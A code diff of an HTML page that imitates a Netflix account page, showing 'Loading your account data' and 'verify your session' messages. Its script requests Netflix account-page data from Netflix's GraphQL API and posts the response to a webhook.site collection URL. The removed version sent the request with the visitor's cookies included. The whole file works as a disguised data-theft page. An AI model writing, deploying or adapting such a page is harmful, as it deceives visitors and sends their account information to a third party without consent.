@@ -1,57 +1,57 @@
 <!-- /netflix/account.html -->
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Netflix Account</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #000;
-      color: #fff;
-      text-align: center;
-      padding: 100px;
-    }
-    .netflix-logo {
-      width: 200px;
-      margin-bottom: 30px;
-    }
-  </style>
-</head>
-<body>
-  <img class="netflix-logo" src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico" alt="Netflix Logo" />
-  <h2>Loading your account data...</h2>
+  <head>
+    <title>Netflix Account</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #000;
+        color: #fff;
+        text-align: center;
+        padding: 100px;
+      }
+      .netflix-logo {
+        width: 200px;
+        margin-bottom: 30px;
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Use your uploaded image on GitHub Pages -->
+    <img class="netflix-logo" src="https://prithiby.github.io/evilflix/assets/netflix01.svg" alt="Netflix Logo">
+    <h2>Loading your account data...</h2>
+    <p>Please wait while we verify your session...</p>
 
-  <script>
-    fetch("https://web.prod.cloud.netflix.com/graphql", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json",
-        "Referer": window.location.href
-      },
-      body: JSON.stringify({
-        operationName: "CLCSInterstitialAccountPages",
-        variables: {
-          imageFormat: "PNG",
-          resolutionMode: "WEB_2X",
-          format: "HTML",
-          accountSubpage: "/account"
-        },
-        extensions: {
-          persistedQuery: {
-            id: "e62bc06d-1c10-4b66-b133-2c4b99bcbe1d",
-            version: 102
-          }
-        }
-      })
-    })
-    .then(res => res.text())
-    .then(data => {
-      fetch("https://webhook.site/5d184c62-9161-4cc4-9408-eed239d7e202", {
+    <script>
+      fetch("https://web.prod.cloud.netflix.com/graphql", {
         method: "POST",
-        body: data
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          operationName: "CLCSInterstitialAccountPages",
+          variables: {
+            imageFormat: "PNG",
+            resolutionMode: "WEB_2X",
+            format: "HTML",
+            accountSubpage: "/account"
+          },
+          extensions: {
+            persistedQuery: {
+              id: "e62bc06d-1c10-4b66-b133-2c4b99bcbe1d",
+              version: 102
+            }
+          }
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        fetch("https://webhook.site/5d184c62-9161-4cc4-9408-eed239d7e202", {
+          method: "POST",
+          body: data
+        });
       });
-    });
-  </script>
-</body>
+    </script>
+  </body>
 </html>
